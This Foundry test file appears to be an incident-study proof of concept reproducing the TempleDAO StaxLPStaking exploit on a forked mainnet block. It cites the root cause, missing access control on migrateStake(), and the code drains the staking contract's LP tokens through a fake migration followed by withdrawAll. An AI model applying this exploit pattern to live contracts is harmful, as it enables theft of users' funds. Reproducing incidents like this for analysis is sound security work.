// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : $~2.3M
// Attacker : 0x9c9fb3100a2a521985f0c47de3b4598dafd25b01
// Attack Contract : https://etherscan.io/address/0x2df9c154fe24d081cfe568645fb4075d725431e0
// Vulnerable Contract : https://etherscan.io/address/0xd2869042e12a3506100af1d192b5b04d65137941
// Attack Tx : https://etherscan.io/tx/0x8c3f442fc6d640a6ff3ea0b12be64f1d4609ea94edd2966f42c01cd9bdcf04b5

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xd2869042e12a3506100af1d192b5b04d65137941#code#F1#L241

// @Analysis
// Twitter BlockSecTeam : https://twitter.com/BlockSecTeam/status/1579843881893769222
// Twitter FrankResearcher : https://twitter.com/FrankResearcher/status/1579840347647414272
// Twitter Spreek : https://twitter.com/spreekaway/status/1579836562338361345
// Rekt news : https://rekt.news/templedao-rekt/
// Root cause: Insufficient access control of the `migrateStake()` function.

interface IStaxLPStaking {
    function migrateStake(address oldStaking, uint256 amount) external;
    function withdrawAll(bool claim) external;
}

contract ContractTest is Test {
    IERC20 constant xFraxTempleLP = IERC20(0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9);
    IStaxLPStaking constant StaxLPStaking = IStaxLPStaking(0xd2869042E12a3506100af1D192b5b04D65137941);

    function setUp() public {
        vm.createSelectFork("mainnet", 15_725_066);
        // Adding labels to improve stack traces' readability
        vm.label(address(xFraxTempleLP), "xFraxTempleLP");
        vm.label(address(StaxLPStaking), "StaxLPStaking");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker xFraxTempleLP balance before exploit", xFraxTempleLP.balanceOf(address(this)), 18
        );

        uint256 lpbalance = xFraxTempleLP.balanceOf(address(StaxLPStaking));

        // Perform migrateStake()
        StaxLPStaking.migrateStake(address(this), lpbalance);

        // Perform withdrawAll()
        StaxLPStaking.withdrawAll(false);

        emit log_named_decimal_uint(
            "[End] Attacker xFraxTempleLP balance after exploit", xFraxTempleLP.balanceOf(address(this)), 18
        );
    }

    function migrateWithdraw(
        address,
        uint256
    )
        public //callback
    {}
}
